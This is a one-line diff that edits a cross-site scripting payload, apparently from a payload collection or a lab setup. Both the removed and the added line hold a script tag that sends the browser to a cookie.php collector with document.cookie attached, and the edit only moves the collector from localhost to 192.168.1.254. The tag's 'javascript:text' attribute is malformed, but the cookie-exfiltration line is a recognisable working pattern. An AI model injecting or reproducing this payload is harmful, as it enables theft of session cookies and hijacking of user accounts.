@@ -1,1 +1,1 @@
-<script javascript:text>document.location="http://localhost/cookie.php?c=" + document.cookie + "&t=Alert"; </script>
+<script javascript:text>document.location="http://192.168.1.254/cookie.php?c=" + document.cookie + "&t=Alert"; </script>
